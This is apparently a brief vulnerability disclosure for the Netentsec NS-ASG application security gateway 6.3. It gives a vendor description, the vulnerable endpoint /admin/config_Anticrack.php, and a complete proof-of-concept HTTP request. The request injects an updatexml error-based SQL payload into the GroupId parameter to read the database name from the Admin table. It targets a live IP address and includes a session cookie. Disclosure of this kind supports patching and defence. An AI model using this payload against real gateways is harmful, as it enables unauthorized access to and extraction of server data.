Beijing Wangkang Technology Co., Ltd. is a leading provider of network application management equipment in China, focusing on the latest trend research and analysis in the field of network application management. It provides users with advanced network application management technology, products, and solutions, aiming to help users achieve the goal of "using the internet well" in network management.

There is an SQL injection vulnerability in the Netcom NS-ASG application security gateway. Attackers exploit vulnerabilities to cause harm to servers.

official： https://www.netentsec.com/

version:6.3

Vulnerability Path ：/admin/config_Anticrack.php


POC：
```
GET /admin/config_Anticrack.php?GroupId=222%20and%201=(updatexml(1,concat(0x5e24,(select%20concat(0x3a,1,0x3a,database(),0x3a)%20from%20Admin%20limit%200,1),0x5e24),1))--a HTTP/1.1
Host: 1.85.53.53
Cookie: PHPSESSID=72e866e42700903cf0b49c4938cbda93
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```
<img width="607" alt="image" src="https://github.com/flyyue2001/cve/assets/88701694/9661f1d8-240d-486e-8538-8fdba232fb8a">
